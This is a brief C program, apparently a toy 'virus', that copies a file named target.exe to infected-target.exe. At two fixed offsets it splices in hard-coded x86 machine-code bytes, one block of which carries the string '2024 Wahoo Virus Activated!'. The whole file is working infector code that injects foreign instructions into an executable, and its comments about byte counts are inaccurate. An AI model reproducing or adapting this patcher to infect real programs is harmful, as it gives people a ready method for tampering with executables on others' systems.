#include <stdio.h>
#define _OPEN_SYS_ITOA_EXT
#include <stdlib.h>
#include <stdbool.h> 

void main() {
    FILE *file;
    file = fopen("target.exe","rb");
    int c;
    int i = 0;
    FILE *write_ptr;
    write_ptr = fopen("infected-target.exe","wb");

    unsigned char ucDataBlock[45] = {
        0xC9, 0xC3, 0xC7, 0x04, 0x24, 0x48, 0x84, 0x04, 0x08, 0xE8, 0x9A, 0xFE,
        0xFF, 0xFF, 0xC9, 0xC3, 0x09, 0x32, 0x30, 0x32, 0x34, 0x20, 0x57, 0x61,
        0x68, 0x6F, 0x6F, 0x20, 0x56, 0x69, 0x72, 0x75, 0x73, 0x20, 0x41, 0x63,
        0x74, 0x69, 0x76, 0x61, 0x74, 0x65, 0x64, 0x21, 0x00
    };

    unsigned char ucDataBlock2[12] = {
	    0xE8, 0xA3, 0xFF, 0xFF, 0xFF, 0xC9, 0xB8, 0x21, 0x00, 0x00, 0x00, 0xC3
    };

    while( (c = fgetc(file)) != EOF ) {
        
            if (i == 1080) {
                int k;
                for (k = 0; k < 45; k++) {
                    fwrite(&ucDataBlock[k],1,1,write_ptr);
                    c = fgetc(file);
                }
                i = 1124;
            }

            if (i == 1169) {
                int k;
                for (k = 0; k < 12; k++) {
                    fwrite(&ucDataBlock2[k],1,1,write_ptr); // write 10 bytes from our buffer
                    c = fgetc(file);
                }
                i = 1180;
            }
            
            fwrite(&c,1,1,write_ptr); // write 10 bytes from our buffer

            i += 1;    
    }
}